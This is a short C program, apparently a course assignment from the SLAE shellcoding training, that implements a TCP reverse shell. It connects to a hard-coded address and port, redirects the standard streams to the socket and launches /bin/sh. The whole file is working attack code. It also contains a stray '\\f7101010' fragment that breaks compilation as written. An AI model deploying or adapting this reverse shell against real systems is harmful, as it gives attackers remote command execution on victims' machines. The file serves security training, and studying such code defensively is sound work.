// SLAE - Assignment #2: Reverse Shell TCP (x86)
// Author: John Stigerwalt
// Website: slae.whitekngihtlabs.com
// Tested on Kali Linux x86

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)
{
    int i;
    int sockfd;
    socklen_t socklen;

    struct sockaddr_in srv_addr;

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons( 1337 );
    srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); \\f7101010

    sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );

    connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

    for(i = 0; i <= 2; i++)
        dup2(sockfd, i);

    execve( "/bin/sh", NULL, NULL);
}


